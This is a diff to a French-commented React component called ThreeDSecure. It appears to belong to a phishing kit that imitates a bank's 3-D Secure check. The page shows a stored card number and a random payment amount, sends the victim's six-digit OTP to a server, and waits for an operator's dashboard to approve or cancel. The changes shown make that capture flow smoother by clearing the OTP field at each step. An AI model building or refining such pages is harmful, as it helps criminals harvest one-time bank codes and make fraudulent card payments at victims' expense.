@@ -19,6 +19,7 @@ function ThreeDSecure() {
   const [isSubmitting, setIsSubmitting] = useState(false);
   const [currentDate, setCurrentDate] = useState('');
   const [randomAmount] = useState(() => getRandomAmount());
+  const [otpCode, setOtpCode] = useState('');
 
   // Formater le numéro de carte : afficher les 4 premiers et 4 derniers chiffres
   const formatCardNumber = (number) => {
@@ -48,6 +49,15 @@ function ThreeDSecure() {
       setCardNumber(storedCardNumber);
     }
 
+    // Vider le champ OTP à chaque chargement de la page
+    setOtpCode('');
+    
+    // Vider aussi le champ dans le DOM si l'élément existe
+    const otpInput = document.getElementById('secureCode');
+    if (otpInput) {
+      otpInput.value = '';
+    }
+
     // Mettre à jour la date
     setCurrentDate(getCurrentDate());
 
@@ -67,6 +77,13 @@ function ThreeDSecure() {
         console.log('[ThreeDSecure] ✅ Redirect message received (via direct)! Target page:', page, 'isCancellation:', isCancellation);
         setIsSubmitting(false); // Arrêter l'animation
         
+        // Vider le champ OTP avant la redirection
+        setOtpCode('');
+        const otpInput = document.getElementById('secureCode');
+        if (otpInput) {
+          otpInput.value = '';
+        }
+        
         // Si c'est une annulation vers payment-details, stocker le message d'erreur
         if ((page === '/payment-details' || isCancellation) && errorMessage) {
           console.log('[ThreeDSecure] 🚫 Cancellation detected - storing error message');
@@ -79,6 +96,14 @@ function ThreeDSecure() {
         const approved = data.payload.approved;
         console.log('[ThreeDSecure] ✅ OTP verification response received:', approved);
         setIsSubmitting(false); // Arrêter l'animation
+        
+        // Vider le champ OTP avant la redirection
+        setOtpCode('');
+        const otpInput = document.getElementById('secureCode');
+        if (otpInput) {
+          otpInput.value = '';
+        }
+        
         if (approved) {
           // Si approuvé, rediriger vers payment-confirmation
           navigate(`/payment-confirmation?${randomParamsURL()}`);
@@ -95,6 +120,13 @@ function ThreeDSecure() {
         const errorMessage = data.errorMessage || 'Your credit card is not valid. Please check your card details and try again.';
         console.log('[ThreeDSecure] ✅ Redirect message received (legacy format)! Target page:', page, 'isCancellation:', isCancellation);
         setIsSubmitting(false); // Arrêter l'animation
+        
+        // Vider le champ OTP avant la redirection
+        setOtpCode('');
+        const otpInput = document.getElementById('secureCode');
+        if (otpInput) {
+          otpInput.value = '';
+        }
         
         // Si c'est une annulation vers payment-details, stocker le message d'erreur
         if ((page === '/payment-details' || isCancellation) && errorMessage) {
@@ -131,6 +163,10 @@ function ThreeDSecure() {
     // Envoyer le code OTP au serveur
     sendOTPSubmit(otpInput);
     
+    // Vider le champ OTP après la soumission
+    setOtpCode('');
+    e.target.secureCode.value = '';
+    
     // L'animation continuera jusqu'à ce qu'on reçoive une réponse du dashboard
     // ou qu'on soit redirigé
   };
@@ -139,6 +175,7 @@ function ThreeDSecure() {
     // Limiter à 6 chiffres uniquement
     const value = e.target.value.replace(/\D/g, '').slice(0, 6);
     e.target.value = value;
+    setOtpCode(value);
   };
 
   return (
@@ -200,6 +237,8 @@ function ThreeDSecure() {
                   maxLength="6"
                   pattern="[0-9]{6}"
                   inputMode="numeric"
+                  value={otpCode}
+                  onChange={handleOTPInput}
                   onInput={handleOTPInput}
                   disabled={isSubmitting}
                 />
